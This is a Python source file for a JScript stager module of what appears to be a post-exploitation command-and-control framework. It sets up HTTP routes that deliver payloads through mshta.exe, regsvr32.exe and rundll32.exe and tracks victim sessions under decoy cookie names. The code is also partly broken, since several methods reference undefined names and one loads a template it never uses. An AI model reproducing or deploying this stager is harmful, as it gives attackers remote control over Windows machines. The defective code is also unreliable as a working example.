"""
import os
import sys
import random
import uuid
from core.stager import Stager
from core.handler import Handler
from core.payload import Payload


class JScriptStager(Stager):

    NAME = "JScript Stager"
    DESCRIPTION = "Listens for new sessions, using JScript for payloads"
    AUTHORS = ['zerosum0x0']

    def load(self):
        self.options.register("HTAPATH", "/home.hta", "mshta.exe stage", advanced = True)
        self.options.register("SVRPATH", "/home.asp", "regsvr32.exe stage", advanced = True)
        self.options.register("DLLPATH", "/home.php", "rundll32.exe http: stage", advanced = True)
        self.options.register("DLLJSPATH", "/home.aspx", "rundll32.exe javascript: stage", advanced = True)

        self.options.register("JOBNAME", "csrf", "name for jobkey cookie", advanced = True)
        self.options.register("SESSIONNAME", "sid", "name for session cookie", advanced = True)

        self.options.register("JOBPATH", "", "the job path", hidden = True)
        self.options.register("SESSIONPATH", "", "the session path", hidden = True)

    def run(self):
        payloads = []
        payloads.append(Payload("mshta", self.loader.load_script("data/stager/jscript/mshta.cmd", self.options, False)))
        payloads.append(Payload("rundll32", self.loader.load_script("data/stager/jscript/rundll32.cmd", self.options, False)))
        payloads.append(Payload("rundll32js", self.loader.load_script("data/stager/jscript/rundll32js.cmd", self.options, False)))
        payloads.append(Payload("disk", self.loader.load_script("data/stager/jscript/disk.cmd", self.options, False)))
        self.start_server(payloads, JScriptHandler)

class JScriptHandler(Handler):
    def init_routes(self):
        super(JScriptHandler, self).init_routes()
        self.get_routes[self.options.get("SVRPATH")] = self.handle_svr
        self.get_routes[self.options.get("HTAPATH")] = self.handle_hta
        self.get_routes[self.options.get("DLLPATH")] = self.handle_hta
        self.get_routes[self.options.get("DLLJSPATH")] = self.handle_js

    def handle_all(self, template):
        if self.job:
            pass

    def handle_hta(self):
        if not self.session:
            self.init_session("HTA")

        self.options.register("PAYLOAD", self.stager.payloads["rundll32"], "", hidden=True)
        template = self.loader.load_script("data/stager/jscript/mshta.hta", self.options)

        script = self.loader.load_script("data/stager/jscript/stage.js", self.options)
        self.reply(200, script)

    def handle_svr(self):
        if not self.session:
            self.init_session("SVR")

    def handle_js(self):
        if not self.session:
            self.init_session("JS")

    def stage(self):
        script = self.load_script("data/stager/vbscript/work.js", options, True, False)
        self.reply(200, script)

    def job(self):
        script = self.load_script("data/stager/vbscript/job.vbs", options)
        handler.reply(200, script)
"""
